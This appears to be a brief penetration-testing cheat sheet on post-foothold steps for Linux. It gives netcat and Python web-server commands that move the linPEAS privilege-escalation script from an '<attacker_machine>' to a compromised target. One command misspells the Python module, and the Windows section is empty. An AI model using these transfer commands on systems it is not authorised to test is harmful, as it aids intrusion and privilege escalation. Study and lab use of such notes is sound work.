# Following the initial foothole, tools to run

## Linux
```bash
# Download the the linPEAS raw file 
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh 

# Option 1 - Transfer linPEAS to the target via netcat from attacker's machine 
nc -nlvp 4445 < linpeas.sh

nc -nv <attacker_machine> 4445 > linpeas.sh
```

```bash
# Option 2 - Transfer linPEAS to the target via python web server 
python -m SimplyHTTPSerfer 4445 
python3 -m http.server 4445

wget http://<attacker_machine>:4445/linpeas.sh 





## Windows
